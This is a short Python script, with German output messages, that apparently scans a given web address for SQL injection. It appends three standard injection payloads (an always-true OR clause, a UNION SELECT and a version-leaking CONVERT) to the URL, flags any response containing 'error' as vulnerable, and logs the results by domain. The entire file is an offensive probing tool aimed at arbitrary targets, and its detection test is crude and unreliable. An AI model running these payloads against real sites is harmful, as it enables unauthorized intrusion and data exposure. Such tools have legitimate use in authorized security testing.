import requests
from urllib.parse import urlparse
from datetime import datetime

def scan(target_url):
    print("\n🔎 SQL-Injection Scan gestartet...")
    payloads = [
        "' OR '1'='1",
        "' UNION SELECT 1,2,3--",
        "' AND 1=CONVERT(int,@@version)--"
    ]
    
    results = []
    for payload in payloads:
        try:
            response = requests.get(target_url + payload, timeout=5)
            if "error" in response.text.lower():
                results.append(f"VULNERABLE: {payload}")
                print(f"✅ Schwachstelle mit: {payload}")
        except Exception as e:
            print(f"⚠ Fehler: {e}")
    
    if results:
        domain = urlparse(target_url).netloc.replace(".", "_")
        with open(f"../logs/scans/{domain}.log", "a") as f:
            f.write(f"[{datetime.now()}] SQLI_RESULTS:\n" + "\n".join(results) + "\n")
